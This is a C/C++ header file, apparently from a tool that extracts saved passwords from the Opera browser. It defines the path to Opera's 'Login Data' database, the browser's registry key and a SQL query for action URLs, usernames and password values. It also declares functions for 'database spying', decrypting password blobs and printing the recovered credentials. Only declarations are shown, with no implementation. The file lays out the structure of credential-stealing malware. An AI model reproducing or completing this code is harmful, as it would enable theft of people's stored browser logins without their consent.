#pragma once
#include"password.h"


#define O_DBFILE	"\\Opera Software\\Opera Stable\\Login Data" 
#define O_REGKEY	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
#define QUERY		"SELECT action_url, username_value, password_value FROM logins"

	/* Attributes */
	const char* _dbFilePath;
	const char* _regKeyPath;
	int			_folder;
	/*HKEY	_hKey;*/
	bool			_ready;
	

	/* Methods */
	
	void		initOperaBrowser();
	void		databaseSpying();
	BOOL uncryptData(PDATA_BLOB password);
	void        	printPassword(sqlite3_stmt* stmt);
	void        	findPasswordTable(sqlite3* db);
	bool        	findAppdataPath(std::string& appdataPath);
	BOOL            loadFunctions(char* installPath);
	
